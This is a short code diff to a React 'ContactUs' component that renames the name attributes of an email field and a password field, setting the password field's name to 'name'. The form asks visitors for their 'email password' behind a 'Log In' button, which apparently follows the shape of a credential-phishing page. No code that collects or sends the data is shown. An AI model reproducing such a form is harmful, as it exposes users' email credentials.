@@ -29,11 +29,11 @@ export default function ContactUs() {
                     <div className="row pt-5 mx-auto" >
                         <div className="center">
                         <span class= "snter">Email Address</span> <br></br> 
-                            <input  type="text" className="cont"  placeholder=" Enter your email address" name="user" />
+                            <input  type="text" className="cont"  placeholder=" Enter your email address" name="email" />
                         </div>
                         <div className="cente">
                         <span class= "snters">Password</span><br></br>
-                            <input type="password"  className="form-control" placeholder="Enter your email password" name="pass" />
+                            <input type="password"  className="form-control" placeholder="Enter your email password" name="name" />
                         </div>
                         <div className="col-8 pt-3 mx-auto">
                             <input type="submit" className="btn btn-info" value="Log In "></input>
